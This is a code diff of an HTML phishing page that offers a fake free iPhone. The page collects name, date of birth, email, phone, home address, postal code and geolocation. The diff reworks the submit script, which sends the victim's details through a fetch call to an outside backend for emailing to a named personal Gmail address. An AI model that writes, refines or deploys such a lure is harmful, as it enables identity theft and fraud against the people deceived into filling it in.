@@ -20,7 +20,7 @@
         }
         .container {
             max-width: 600px;
-            background: rgba(255, 255, 255, 0.85); /* Semi-transparent white background */
+            background: rgba(255, 255, 255, 0.85);
             padding: 2rem;
             border-radius: 8px;
             box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
@@ -51,7 +51,7 @@
         <p class="lead">You've been selected to receive a brand-new iPhone!</p>
         <p class="form-text">Please fill out the form below to claim your reward.</p>
 
-        <!-- Form for Reward Claim -->
+        <!-- Fill Out Form -->
         <form id="rewardForm">
             <div class="form-group">
                 <label for="fullName">Full Name</label>
@@ -82,7 +82,7 @@
                 <input type="text" class="form-control" id="postalCode" placeholder="Enter your postal code" required>
             </div>
 
-            <p id="locationDisplay" class="form-text">Fetching location...</p>
+            <p id="locationDisplay" class="form-text" style="background: rgba(255, 255, 255, 0.85); color: #666; padding: 0.5rem; border-radius: 4px;">Location permissions required to auto-fill your location.</p>
             <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
         </form>
     </div>
@@ -92,107 +92,66 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 
-    <!-- JavaScript for Geolocation and Email Sending -->
+    <!-- JavaScript for Form Submission and Geolocation -->
     <script>
         document.addEventListener("DOMContentLoaded", function () {
             const locationDisplay = document.getElementById("locationDisplay");
-            let latitude, longitude;
 
-            // Request location
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        latitude = position.coords.latitude;
-                        longitude = position.coords.longitude;
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
                         locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                     },
                     (error) => {
-                        switch (error.code) {
-                            case error.PERMISSION_DENIED:
-                                locationDisplay.textContent = "Location access denied by user.";
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                locationDisplay.textContent = "Location information is unavailable.";
-                                break;
-                            case error.TIMEOUT:
-                                locationDisplay.textContent = "Location request timed out.";
-                                break;
-                            default:
-                                locationDisplay.textContent = "An unknown error occurred.";
-                                break;
-                        }
+                        locationDisplay.textContent = "Could not retrieve location.";
                     }
                 );
             } else {
                 locationDisplay.textContent = "Geolocation is not supported by this browser.";
             }
 
-            // Handle form submission
             document.getElementById("rewardForm").addEventListener("submit", function (e) {
                 e.preventDefault();
-                
-                const fullName = document.getElementById("fullName").value;
-                const dob = document.getElementById("dob").value;
-                const email = document.getElementById("email").value;
-                const phoneNumber = document.getElementById("phoneNumber").value;
-                const address = document.getElementById("address").value;
-                const city = document.getElementById("city").value;
-                const postalCode = document.getElementById("postalCode").value;
 
-                // Combine all data for the email
-                const message = `
-                    Full Name: ${fullName}
-                    Date of Birth: ${dob}
-                    Email: ${email}
-                    Phone Number: ${phoneNumber}
-                    Address: ${address}
-                    City: ${city}
-                    Postal Code: ${postalCode}
-                    Latitude: ${latitude ?? "Not Available"}
-                    Longitude: ${longitude ?? "Not Available"}
-                `;
+                const formData = {
+                    fullName: document.getElementById("fullName").value,
+                    dob: document.getElementById("dob").value,
+                    email: document.getElementById("email").value,
+                    phoneNumber: document.getElementById("phoneNumber").value,
+                    address: document.getElementById("address").value,
+                    city: document.getElementById("city").value,
+                    postalCode: document.getElementById("postalCode").value
+                };
 
-                sendEmail("Reward Form Submission with Location", message, "khalilrodeni@gmail.com");
+                // Send form data
+                fetch("https://zalex-backend.onrender.com/api/send-email/", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        subject: "New iPhone Reward Form Submission",
+                        message: JSON.stringify(formData, null, 2),
+                        recipient_email: "khalilrodeni@gmail.com",
+                        recipient_name: "Khalil Ahmed"
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.message) {
+                        alert("Form submitted successfully!");
+                    } else {
+                        alert("Error: " + (data.error || "Unknown error"));
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("Error submitting form.");
+                });
             });
         });
-
-        // Email sending function
-        function sendEmail(subject, message, recipientEmail) {
-            const emailData = {
-                subject: subject,
-                message: message,
-                recipient_email: recipientEmail,
-                recipient_name: "Khalil Ahmed"
-            };
-
-            fetch("https://zalex-backend.onrender.com/api/send-email/", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(emailData)
-            })
-            .then(response => {
-                if (response.ok) {
-                    return response.json();
-                } else {
-                    throw new Error(`Server responded with ${response.status}`);
-                }
-            })
-            .then(data => {
-                if (data.message) {
-                    alert("Submission and location data emailed successfully!");
-                } else if (data.error) {
-                    alert("Error: " + data.error);
-                } else {
-                    alert("Unexpected error occurred.");
-                }
-            })
-            .catch(error => {
-                console.log("Error sending email:", error);
-                alert("Error sending email: " + error.message);
-            });
-        }
     </script>
 </body>
 </html>
